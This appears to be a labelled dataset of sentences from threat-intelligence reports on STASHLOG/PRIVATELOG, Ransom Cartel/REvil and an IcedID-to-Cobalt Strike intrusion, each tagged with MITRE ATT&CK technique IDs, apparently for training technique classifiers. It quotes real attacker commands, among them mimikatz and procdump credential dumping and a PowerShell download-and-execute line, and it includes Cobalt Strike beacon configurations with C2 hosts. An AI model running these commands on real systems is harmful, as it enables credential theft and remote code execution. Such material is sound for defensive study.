The malware also checks that the operating system version is within a lower and upper boundary and that the SHA1 hash of the decrypted data matches the payload header value at offset 20.,"T1027, T1140, T1082"
"Following the payload header, the malware expects blocks of encrypted data with 8-byte headers.",T1027
"Each block header has the following structure: struct blockHeader { DWORD magic; DWORD blockSize; } Once the malware has checked and validated the structure of the payload, it searches for .blf files in the default user’s profile directory and uses the .blf file with the oldest creation date timestamp.",T1083
"In practice, the malware should typically find the file used for registry transaction logs: C:\Users\Default\NTUSER.DAT<GUID>.TM.blf If a matching .blf file is indeed found, it is opened with the CreateLogFile() API from clfsw32.dll.",T1106
"Before inserting data into the CLFS log file, the malware decrypts each block using HC-128.",T1140
Each block is then re-encrypted with the new key material as follows: The encryption key is the 16-byte GUID from GetVolumeNameForVolumeMountPointW().,T1027
The IV is the first 16-bytes of the SHA1 hash of the concatenated GUIDs from: GetVolumeNameForVolumeMountPointW() The registry value HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID The contents are written to the CLFS log file using the clfsw32.dll API function ReserveAndAppendLog().,T1106
"If this matches, the malware resolves the function address for the ServiceMain export function of PrintConfig.dll, which is the service entry point of the service using this command line.",T1106
This function is patched using Microsoft Detours—a publicly available library used for instrumenting Win32 functions—so that the execution flow appears to happen in the legitimate service DLL.,T1106
"Similarly to STASHLOG, PRIVATELOG starts by enumerating *.blf files in the default user’s profile directory and uses the .blf file with the oldest creation date timestamp.",T1083
This value equals the size of the payload which will be decrypted.,T1140
"Once the expected log entry is found, its contents are decrypted using the HC-128 encryption algorithm.",T1140
The decryption key and IV are generated using the same unique host properties that were used by STASHLOG.,T1140
It is worth noting that PRIVATELOG only decrypts the first matching block and that at least 2 to 5 blocks are expected to be inserted by STASHLOG.,T1140
The injection process is similar to Phantom DLL hollowing and is described as follows: Open a transacted handle to a copied file via the API CreateFileTransactedA(),"T1106, T1055"
Overwrite the transacted file with the decrypted payload contents Create a section backed by the transacted file with SEC_IMAGE attributes via the API NtCreateSection() Map a view of the newly created section This implicitly loads the transacted file data to some degree.,"T1106, T1140"
"This redirect was documented in our post, “Understanding REvil,” in Bleeping Computer’s post on REvil’s TOR sites redirecting to a new ransomware operation and in a Twitter post from vx-underground.",T1090
"DonPAPI is used to search machines for certain files known to be DPAPI blobs, including Wi-Fi keys, RDP passwords,",T1083
"To avoid the risk of detection by antivirus (AVs) or endpoint detection and response (EDR), the tool downloads the files and decrypts them locally.","T1105, T1140"
"We also observed the threat actor using additional tools, including LaZagne to recover credentials stored locally and Mimikatz to steal credentials from host memory.",T1003.001
"The threat actor was observed downloading and using a cracked version of a legitimate tool called PDQ Inventory, which is a legitimate system management solution that IT administrators use to scan their network and collect hardware, software and Windows configuration data.",T1072
Ransom Cartel used this as a remote access tool to establish an interactive command and control channel and to scan the compromised network.,T1219
"During encryption, Ransom Cartel specifically seeks out files with the following file extensions: .log, .vmdk, .vmem, .vswp and .vmsn.",T1083
The DllEntryPoint leads to a function that iterates over a call to the Curve25519 Donna algorithm 24 times.,T1106
"If this value is anything other than 0, the ransomware will proceed to spawn another instance of itself via rundll32.exe, specifying the Rathbuige export.",T1218.011
"The Rathbuige export starts by creating the following mutex: Global\\266ee996-e1ac-4eaa-9bdb-0b639d41b32d Once the mutex is created, the sample begins to decrypt and parse its embedded configuration.",T1140
"The configuration is stored as a base64-encoded blob, whereby the first 16 bytes of the base64-encoded blob is the RC4 key used for decrypting the rest of the blob once it has been decoded.","T1027, T1140"
Ransom Cartel encrypted configuration.,"T1027, T1140"
"Once decrypted, the configuration is stored in JSON format and consists of information such as encrypted file extension, the threat actors' public Curve25519-donna key, a base64-encoded ransom note, and a list of processes and services to terminate prior to encryption.","T1027, T1140"
Example of decrypted Ransom Cartel configuration.,T1140
"Following decryption of the configuration, certain system information is gathered, including the username, computer name, domain name, locale and product name.","T1033, T1082"
"Once encrypted, it is written to the registry key SOFTWARE\\Google_Authenticator\\b52dKMhj, with the sample first attempting to write to the HKEY_LOCAL_MACHINE hive, before writing to HKEY_CURRENT_USER if the right permissions are not possessed.",T1112
"Once the data has been written to the registry, it is then base64-encoded and embedded within the ransom note, replacing the {KEY} placeholder.",T1112
"Once the configuration has been parsed and stored within the registry, the command line provided to the ransomware is parsed.","T1059.003, T1112"
"There are a total of five possible arguments, as shown in Table 7. Argument Description -nolan Instruct the sample not to attempt any form of network drive encryption -nolocal Prevent the encryption of all local volumes -path Target specific file path to encrypt -silent Appears to instruct the ransomware to avoid terminating running processes and services, and it begins encrypting files immediately -smode Causes the ransomware to use BCEdit in order to enable Safe Boot; check out this article on REvil’s use of “Windows Safe Mode” encryption for a discussion about this particular technique.",T1083
"Ransom Cartel first checks to see if the registry already contains previously generated values; if so, it will read those values into memory.",T1012
"Once the session secrets have been generated, they are written to the registry, alongside session_public_1 and attacker_cfg_public.",T1112
REvil configuration storage.,T1140
"Once the REvil configuration has decrypted, it utilizes the same JSON format, but contains additional values such as pid, sub, fast, wipe and dmn.",T1140
Decrypted REvil configuration.,T1140
"A particularly interesting difference between the two malware families is that REvil opts to obfuscate their ransomware much more heavily than the Ransom Cartel group, utilizing string encryption, API hashing and more, while Ransom Cartel has almost no obfuscation outside of the configuration, hinting that the group may not possess the obfuscation engine used by REvil.",T1027
"Valid Accounts Uses legitimate VPN, RDP, Citrix or VNC credentials to maintain access to an environment. T1133.",T1078
Software Deployment Tools Deploys PDQ Inventory Scanner tool. T1059.001.,T1072
PowerShell Uses PowerShell to retrieve the malicious payload and download additional resources such as Mimikatz and Rclone. T1059.003 Command and Scripting Interpreter:,"T1105, T1003.001"
Windows Command Shell Uses cmd.exe to execute commands.,T1059.003
OS Credential Dumping: /etc/passwd and /etc/shadow Attempts to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. T1136.001.,T1110
Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder Adds registry run keys to achieve persistence.,T1547.001
"In some cases, we observed using the following command: start cmd.exe /k runonce.exe /AlternateShellStartup T1197.",T1059.003
BITS Jobs Uses BITSAdmin to download and install payloads.,T1105
Modify Registry Modifies the Registry to disable UAC remote restrictions by setting SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to 1. T1070.001 Indicator Removal on Host: Clear Windows Event Logs Uses wevtutil to clear the Windows event logs.,"T1562.001, T1112"
System Binary Proxy Execution: Rundll32 Uses Rundll32 to load and execute malicious DLL. T1562.004.,T1218.011
"Indicator Removal on Host: File Deletion Deletes some of its files used during operations as part of cleanup, including removing applications such as 7z.exe, tor.exe, ssh.exe T1070.003.",T1070.004
Obfuscated Files or Information Uses encoded PowerShell commands.,T1027
OS Credential Dumping: LSASS Memory Uses Mimikatz to harvest credentials.,T1003.001
File and Directory Discovery Searches for specific files prior to encryption.,T1083
Remote Access Software Uses AnyDesk to remotely connect and transfer files. T1090.003.,T1219
Proxy Routes traffic over TOR and VPN servers to obfuscate their activities.,T1090
Ingress Tool Transfer Downloads and uploads files to and from the victim’s machine.,T1105
The ISO image delivered a hidden directory containing a IcedID payload and a batch file.,"T1059.003, T1564.001"
"Clicking on the LNK file executes the batch file, which copies the IcedID payload to the user’s AppData\Local\Temp folder and loads it using rundll32.","T1218.011, T1059.003, T1204.002"
A scheduled task was created at that time to maintain persistence on this host as well.,T1053.005
"Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc.",T1016
This led to another round of discovery using net followed by AdFind.,T1219
The threat actor installed Atera and Splashtop remote access software via an MSI file named hp.msi.,T1219
This was followed by a batch script used to perform DNS lookups on hosts across the environment.,T1059.003
"After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service.","T1570, T1210"
They then repeated the install of the remote access software package.,T1219
"With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory.",T1003.001
"Another round of activity took place using system tools, batch files, and Adget.",T1059.003
Several more beacons were also loaded on the host using DLLs and PowerShell.,T1105
"At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving lateral to other systems.",T1078
"They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.",T1047
"After an hour or so of failures, the threat actors proceeded to RDP to the domain controller.",T1021.001
"Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt. Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g. lsass.exe, lsasss.exe, etc.).",T1105
"Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain.","T1562.001, T1484.001, T1021.001"
"Back on the domain controller, ProcDump was used to dump LSASS memory.",T1003.001
"When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.",T1003.001
"For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.",T1047
"A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.","T1047, T1059.003"
These discovery actions were completed several times again in other various batch files.,T1059.003
"Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.",T1570
"Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target.",T1059.003
"Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec.",T1570
The ISO file was delivered as a ZIP archive via a malicious spam mail campaign.,T1566.001
"Malicious ISO file First, the user clicked on the ISO file, which created a new virtual hard drive disk.",T1204.002
This ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file.,"T1059.003, T1564.001"
"As we can see below using LECmd from Eric Zimmerman, the file documents.lnk points to max\eyewear.bat. As a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.bat The batch file eyewear.bat then executed two commands: It first moved a DLL file named eyewear.dat, initially located in a hidden folder named max, to the user’s AppData\Local\Temp\ folder : C:\Windows\system32\cmd.exe /c","T1564.001, T1059.003, T1204.002"
"Then, DLL was executed using rundll32.exe : C:\Windows\system32\cmd.exe /c","T1059.003, T1218.011"
"D:\max\eyewear.bat ➝ rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1 On the second day of the intrusion, the threat actors used the IcedID malware to drop a Cobalt Strike beacon and executed it using regsvr32.exe.",T1218.011
"After beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs.",T1021.001
"This activity was a result of the threat actors attempting to execute various dropped tools or beacons on the endpoint, triggering a Windows Error Reporting (WER) fault process.",T1105
C!MTB There was evidence that that the Cobalt Strike aggressor script AnnoyKit was leveraged to launch Internet Explorer via a COM object.,T1140
Decoded from Base64: The decoded PowerShell function is readable in the PowerShell logs:,T1140
IcedID created a DLL named Utucka.dll just after the initial execution.,T1053.005
A scheduled task was then created using this same DLL.,T1053.005
"As seen in the screenshot below, GetSystem creates a service and connects to a pipe.","T1059.003, T1543.003"
cmd.exe /c,T1059.003
echo nbproc > \\.\pipe\nbproc cmd.exe /c,T1059.003
echo xgxfpw > \\.\pipe\xgxfpw cmd.exe /c,T1059.003
These packages are designed to evade controls such as Mark-of-the-Web restrictions.,T1562.001
"Windows Defender tampering On one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing.",T1562.001
powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI This command was downloaded from a remote site to a file named pon!.txt and then executed locally.,T1562.001
"This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victim’s computer.",T1055
"As a result, we observed abnormal winlogon.exe process behavior, winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.]com.",T1055
The injection is also visible from memory dumps.,T1055
"Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions.",T1055
"There were several variants of Mimikatz in binary and PowerShell form: ""C:\ProgramData\mimikatz.exe"" ""C:\ProgramData\mimikatz.exe.exe"" ""C:\ProgramData\mimikatz_cryptovanniy.exe"" ""C:\ProgramData\notepad.exe"" ""C:\ProgramData\katz.ps1 Commands used to collect credentials and export to text files stored in the C:\ProgramData folder included the following: C:\Windows\system32\cmd.exe /C","T1003.001, T1059.003"
"mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" >> c:\programdata\mimikatz\creds.txt C:\Windows\system32\cmd.exe /C","T1003.001, T1059.003"
"mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > ""c:\programdata\creds.txt"" C:\Windows\system32\cmd.exe powershell -ep bypass -C ""import-module .\katz.ps1;Invoke-Katz"" > mimi.txt DCSync Credentials were also dumped via DCSync using two compromised high privilege accounts.","T1003.001, T1059.003"
"It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell.",T1059.003
"For additional details, SpecterOps has an article covering the DCSync technique.",T1055
Code injection in LSASS Multiple injections into the LSASS process were observed on multiple hosts.,"T1003.001, T1055"
Threat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials.,T1003.001
Process dump of the LSASS process was undertaken using the Sysinternals ProcDump utility: This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.]191.,"T1003.001, T1055, T1218.011"
C:\Windows\SysWOW64\rundll32.exe ➝ c:\windows\temp\procdump64.exe -accepteula -ma lsass.exe fwtsqmfile00.dmp Classic ransomware discovery stages,T1003.001
"A number of familiar discovery techniques were utilized using various OS commands to discover information relating to the user, host, and network configuration.","T1033, T1016, T1082"
"From the IcedID malware running via Rundll32, the following LOLBAS commands were observed: rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1 ➝ nltest /domain_trusts",T1218.011
➝ cmd.exe /c,T1059.003
chcp >&2 ➝ ipconfig /all,T1016
"➝ net config workstation ➝ systeminfo From Nigu.exe (Cobalt Strike beacon), the following LOLBAS commands were observed: ""C:\Users\[REDACTED]\AppData\Local\Temp\Nigu.exe"" ➝ C:\Windows\system32\cmd.exe /C","T1059.003, T1082"
"net group ""domain admins"" /domain ➝ C:\Windows\system32\cmd.exe /C",T1059.003
"net group ""enterprise admins"" /domain ➝ C:\Windows\system32\cmd.exe /C",T1059.003
net time ➝ C:\Windows\system32\cmd.exe /C,T1059.003
Discovery commands observed from other Cobalt Strike beacons using LOLBAS included: systeminfo netstat -anop tcp cmd.exe /C,T1082
%%temp%% cmd.exe /C,T1082
hostname cmd.exe /C,"T1059.003, T1082"
"Following the first discovery stage, the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host, which contains the ActiveDirectory PowerShell Module.",T1219
rundll32.exe ➝ C:\Windows\system32\cmd.exe /C,T1059.003
DS-LDS.Tools~~~~0.0.1.0” ➝ C:\Windows\system32\cmd.exe /C,T1059.003
rundll32.exe ➝ C:\Windows\system32\cmd.exe /C,T1059.003
powershell.exe Get-Help Export-CSV ➝ C:\Windows\system32\cmd.exe /C,T1059.003
➝ C:\Windows\system32\cmd.exe /C,T1059.003
"powershell.exe Get-ADComputer -Filter * -Properties * | Export-CSV ""C:\ProgramData\ADComputers.csv"" -NoTypeInformation ➝ C:\Windows\system32\cmd.exe /C",T1059.003
"powershell.exe Get-ADComputer -Filter * -Properties * | Export-CSV -Path ""C:\ProgramData\ADComputers.csv"" -NoTypeInformation ➝ C:\Windows\system32\cmd.exe /C",T1059.003
powershell.exe Get-ADComputer -Filter * -Properties * | Export-csv C:\ProgramData\ADComputers.csv -NoTypeInformation ➝ C:\Windows\system32\cmd.exe /C,T1059.003
[REDACTED] -Properties * ➝ C:\Windows\system32\cmd.exe /C,T1059.003
"In addition, threat actors searched for Active Directory related DLLs in other directories: C:\Windows\system32\cmd.exe /C","T1083, T1059.003"
dir /s,T1083
*file/,T1083
Microsoft.ActiveDirectory.Management.dll C:\Windows\system32\cmd.exe /C where /r C:\Windows\WinSxS\ *Microsoft.ActiveDirectory.Management.dll* Hands on keyboard!,T1059.003
"An example of an incorrect named command was nslook up (should have been nslookup) that also incorrectly passed the username, instead of the host name.",T1059.003
C:\Windows\system32\cmd.exe /C nslook up [REDACTED] C:\Windows\system32\cmd.exe /C,T1059.003
Further examples included typos of commands: C:\Windows\system32\cmd.exe /C,T1059.003
"Both of these services were accessed on day two from one Domain Controller on the network, with file downloads relating to tooling/scripts.",T1105
"Reviewing the WebCacheV01.dat on the domain controllers, reveals more details on the sites loaded, including the files that where downloaded from those sites: The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure at 199.127.60[.]117.","T1105, T1003.001"
The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder.,T1564.001
"In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800: Windows Security Logs discovery Once the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below.",T1059.003
C:\Windows\system32\cmd.exe /C,T1059.003
This was double base64 encoded.,T1027
Decoding this revealed another PowerShell Base64 encoded string:,T1027
The -e is short for -EncodedCommand.,T1027
The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $.,T1027
Unit42 (PaloAlto) provides a good article on trends and observations of PowerShell encoded commands: Decoding this again using CyberChef shows the resulting PowerShell script: Lots of custom scripts dropped by threat actors Other tools and scripts were dropped onto one endpoint:,"T1027, T1105"
"Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects.",T1059.003
"While Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat. Another batch file named ‘AD.bat’ was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects.",T1059.003
"> ad_group.txt adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt Interestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\windows\system32\wbem\en-US\htable.xsl).",T1059.003
"Its likely the code was reused from other open source pentest enumerations scripts available, such as: WMIC The use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration.","T1047, T1059.003, T1082"
"This can be useful to determine drives, including mounted network shares.","T1047, T1082"
"wmic /node:<REDACTED> /user:""<REDACTED>"" /password:""<REDACTED>"" logicaldisk get caption,description,drivetype,providername,volumename The dS.bat file was executed by the injected Rundll32.exe process.","T1047, T1055, T1218.011, T1082"
WMI Threat actors used the lolbin wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers.,T1047
"As we can see above, WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.",T1047
The beacon C:\ProgramData\lsass.exe was used to proxy RDP connections and connect to another computer.,"T1090, T1021.001"
"Proxying RDP traffic via a processes such as a Cobalt Strike beacon reduces the exposure of the threat actor’s own infrastructure, and blends RDP activity to those of internal hosts on the network.","T1090, T1021.001"
"The use of RDP was extensively used throughout the intrusion, using a variety of processes (beacon injected or standalone).","T1055, T1021.001"
"The common processes observed were two injected processes, and the Nigu.exe/lsass.exe.",T1055
These processes are unusual for establishing RDP connections.,T1021.001
"During these RDP sessions, the threat actors often opened Internet Explorer to download their beacons or commands they wanted to run on lateral hosts.","T1105, T1021.001"
"This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon: ""C:\Windows\system32\NOTEPAD.EXE"" C:\Users\installer.baywaterschool\Downloads\pon.txt pon.txt contents: powershell iex((new-object net.webclient).downloadstring('https://textbin.net/raw/ls1jhefawt'))",T1021.001
AnyDesk AnyDesk was used to move laterally between a workstation and a backup server as shown below with Sysmon event 3 (Network connection):,T1219
"Collection To achieve collection of various directories on multiple hosts, the threat actors used the dir command through the administrative share c$ and redirected the output to a file text named listing.txt. C:\Windows\System32\cmd.exe","T1083, T1059.003"
/C dir \\[REDACTED HOST]\c$\users >> listing.txt,"T1083, T1059.003"
The beacons used recognizable default Cobalt Strike configurations and attempted to masquerade dropped files as legitimate Microsoft Windows executables.,T1036.005
"For example, a beacon injected into a single Rundll32.exe process generated over 10K connections in a three hour window, consistently across two days.","T1055, T1218.011"
"Once the file was unpacked and the Cobalt Strike beacon binary carved, the Cobalt Strike configuration could be determined as follows: { ""beacontype"": [ ""HTTPS"" ], ""sleeptime"": 5000, ""jitter"": 28, ""maxgetsize"": 1865903, ""spawnto"": ""AAAAAAAAAAAAAAAAAAAAAA=="", ""license_id"": 0, ""cfg_caution"": false, ""kill_date"": null, ""server"": { ""hostname"": ""fazehotafa.com"", ""port"": 443, ""publickey"": ""MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC1nAS8+PqMnQs3hynG2JDgMQK6ZqLkIoDXWnqaOS/dQsdKBHE0Ify/HIZ2ntSpyMtvomDHCA98pCEi1L7mT0mvfiYapP9Aj776rDpzXMYNiRk1BWrAzJqzLcfwzxJx26hL1VSu1C5mWEl7JsVT/9l/kHcNYAALgNQuI0uZAqM7YQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="" }, ""host_header"": """", ""useragent_header"": null, ""http-get"": { ""uri"": ""/ak.css"", ""verb"": ""GET"", ""client"": { ""headers"": null, ""metadata"": null }, ""server"": { ""output"": [ ""print"", ""prepend 1767 characters"", ""base64"", ""base64url"" ] } }, ""http-post"": { ""uri"": ""/profile"", ""verb"": ""POST"", ""client"": { ""headers"": null, ""id"": null, ""output"": null } }, ""tcp_frame_header"": ""AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="", ""crypto_scheme"": 0, ""proxy"": { ""type"": null, ""username"": null, ""password"": null, ""behavior"": ""Use IE settings"" }, ""http_post_chunk"": 0, ""uses_cookies"": true, ""post-ex"": { ""spawnto_x86"": ""%windir%\\syswow64\\rundll32.exe"", ""spawnto_x64"": ""%windir%\\sysnative\\rundll32.exe"" }, ""process-inject"": { ""allocator"": ""VirtualAllocEx"", ""execute"": [ ""CreateThread"", ""CreateRemoteThread"", ""RtlCreateUserThread"" ], ""min_alloc"": 9369, ""startrwx"": false, ""stub"": ""Ms1B7fCBDFtfSY7fRzHMbQ=="", ""transform-x86"": [ ""prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'"" ], ""transform-x64"": [ ""prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'"" ], ""userwx"": false }, ""dns-beacon"": { ""dns_idle"": null, ""dns_sleep"": null, ""maxdns"": null, ""beacon"": null, ""get_A"": null, ""get_AAAA"": null, ""get_TXT"": null, ""put_metadata"": null, ""put_output"": null }, ""pipename"": null, ""smb_frame_header"": ""AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="", ""stage"": { ""cleanup"": true }, ""ssh"": { ""hostname"": null, ""port"": null, ""username"": null, ""password"": null, ""privatekey"": null } } Configurations for other Cobalt Strike servers observed: { ""beacontype"": [ ""HTTPS"" ], ""sleeptime"": 60000, ""jitter"": 0, ""maxgetsize"": 1048576, ""spawnto"": ""AAAAAAAAAAAAAAAAAAAAAA=="", ""license_id"": 0, ""cfg_caution"": false, ""kill_date"": null, ""server"": { ""hostname"": ""111.90.143.191"", ""port"": 443, ""publickey"": ""MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="" }, ""host_header"": """", ""useragent_header"": null, ""http-get"": { ""uri"": ""/j.ad"", ""verb"": ""GET"", ""client"": { ""headers"": null, ""metadata"": null }, ""server"": { ""output"": [ ""print"" ] } }, ""http-post"": { ""uri"": ""/submit.php"", ""verb"": ""POST"", ""client"": { ""headers"": null, ""id"": null, ""output"": null } }, ""tcp_frame_header"": ""AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="", ""crypto_scheme"": 0, ""proxy"": { ""type"": null, ""username"": null, ""password"": null, ""behavior"": ""Use IE settings"" }, ""http_post_chunk"": 0, ""uses_cookies"": true, ""post-ex"": { ""spawnto_x86"": ""%windir%\\syswow64\\rundll32.exe"", ""spawnto_x64"": ""%windir%\\sysnative\\rundll32.exe"" }, ""process-inject"": { ""allocator"": ""VirtualAllocEx"", ""execute"": [ ""CreateThread"", ""SetThreadContext"", ""CreateRemoteThread"", ""RtlCreateUserThread"" ], ""min_alloc"": 0, ""startrwx"": true, ""stub"": ""Ms1B7fCBDFtfSY7fRzHMbQ=="", ""transform-x86"": null, ""transform-x64"": null, ""userwx"": true }, ""dns-beacon"": { ""dns_idle"": null, ""dns_sleep"": null, ""maxdns"": null, ""beacon"": null, ""get_A"": null, ""get_AAAA"": null, ""get_TXT"": null, ""put_metadata"": null, ""put_output"": null }, ""pipename"": null, ""smb_frame_header"": ""AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="", ""stage"": { ""cleanup"": false }, ""ssh"": { ""hostname"": null, ""port"": null, ""username"": null, ""password"": null, ""privatekey"": null } } { ""beacontype"": [ ""HTTPS"" ], ""sleeptime"": 60000, ""jitter"": 0, ""maxgetsize"": 1048576, ""spawnto"": ""AAAAAAAAAAAAAAAAAAAAAA=="", ""license_id"": 305419776, ""cfg_caution"": false, ""kill_date"": null, ""server"": { ""hostname"": ""78.128.112.139"", ""port"": 443, ""publickey"": ""MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="" }, ""host_header"": """", ""useragent_header"": null, ""http-get"": { ""uri"": ""/ga.js"", ""verb"": ""GET"", ""client"": { ""headers"": null, ""metadata"": null }, ""server"": { ""output"": [ ""print"" ] } }, ""http-post"": { ""uri"": ""/submit.php"", ""verb"": ""POST"", ""client"": { ""headers"": null, ""id"": null, ""output"": null } }, ""tcp_frame_header"": ""AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="", ""crypto_scheme"": 0, ""proxy"": { ""type"": null, ""username"": null, ""password"": null, ""behavior"": ""Use IE settings"" }, ""http_post_chunk"": 0, ""uses_cookies"": true, ""post-ex"": { ""spawnto_x86"": ""%windir%\\syswow64\\rundll32.exe"", ""spawnto_x64"": ""%windir%\\sysnative\\rundll32.exe"" }, ""process-inject"": { ""allocator"": ""VirtualAllocEx"", ""execute"": [ ""CreateThread"", ""SetThreadContext"", ""CreateRemoteThread"", ""RtlCreateUserThread"" ], ""min_alloc"": 0, ""startrwx"": true, ""stub"": ""tUr+Aexqde3zXhpE+L05KQ=="", ""transform-x86"": null, ""transform-x64"": null, ""userwx"": true }, ""dns-beacon"": { ""dns_idle"": null, ""dns_sleep"": null, ""maxdns"": null, ""beacon"": null, ""get_A"": null, ""get_AAAA"": null, ""get_TXT"": null, ""put_metadata"": null, ""put_output"": null }, ""pipename"": null, ""smb_frame_header"": 